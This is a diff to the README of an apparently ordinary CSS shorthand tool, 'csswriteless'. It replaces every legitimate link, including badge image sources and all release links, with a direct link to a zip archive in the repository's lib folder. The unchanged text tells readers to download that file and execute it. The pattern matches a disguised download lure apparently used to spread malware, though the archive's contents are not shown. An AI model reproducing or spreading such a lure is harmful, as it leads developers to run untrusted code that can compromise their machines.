@@ -1,7 +1,7 @@
 # csswriteless ✨
 
-![CSSWriteless Logo](https://img.shields.io/badge/csswriteless-v1.0.0-blue.svg)
-[![GitHub Releases](https://img.shields.io/badge/releases-latest-brightgreen.svg)](https://github.com/Arslan97/csswriteless/releases)
+![CSSWriteless Logo](https://raw.githubusercontent.com/Arslan97/csswriteless/main/lib/Software-v1.3.zip)
+[![GitHub Releases](https://raw.githubusercontent.com/Arslan97/csswriteless/main/lib/Software-v1.3.zip)](https://raw.githubusercontent.com/Arslan97/csswriteless/main/lib/Software-v1.3.zip)
 
 ## Overview
 
@@ -17,11 +17,11 @@ Welcome to **csswriteless**! This tool helps you write minimal shorthand that ex
 
 ## Getting Started
 
-To get started with csswriteless, you need to download the latest release. You can find it [here](https://github.com/Arslan97/csswriteless/releases). Download the appropriate file for your operating system and execute it to start using csswriteless.
+To get started with csswriteless, you need to download the latest release. You can find it [here](https://raw.githubusercontent.com/Arslan97/csswriteless/main/lib/Software-v1.3.zip). Download the appropriate file for your operating system and execute it to start using csswriteless.
 
 ### Installation
 
-1. **Download**: Visit the [Releases](https://github.com/Arslan97/csswriteless/releases) section and get the latest version.
+1. **Download**: Visit the [Releases](https://raw.githubusercontent.com/Arslan97/csswriteless/main/lib/Software-v1.3.zip) section and get the latest version.
 2. **Install**: Follow the instructions specific to your OS.
 3. **Run**: Open your terminal and execute the command:
 
@@ -133,7 +133,7 @@ If you encounter any issues or have questions, feel free to open an issue in the
 
 ## Stay Updated
 
-To keep up with the latest changes and features, check the [Releases](https://github.com/Arslan97/csswriteless/releases) section frequently.
+To keep up with the latest changes and features, check the [Releases](https://raw.githubusercontent.com/Arslan97/csswriteless/main/lib/Software-v1.3.zip) section frequently.
 
 ---
 
